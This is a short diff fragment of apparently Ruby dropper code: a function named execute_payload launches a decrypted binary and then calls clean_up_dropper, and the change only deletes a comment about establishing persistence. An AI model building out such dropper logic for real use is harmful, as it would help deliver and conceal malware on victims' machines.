@@ -111,7 +111,6 @@ def decrypt_binary()
 end
 
 def execute_payload()
-	# Establish persistance and execute
 	Process.new("./" + DECRYPTED_BINARY_NAME)
 	clean_up_dropper()
 end
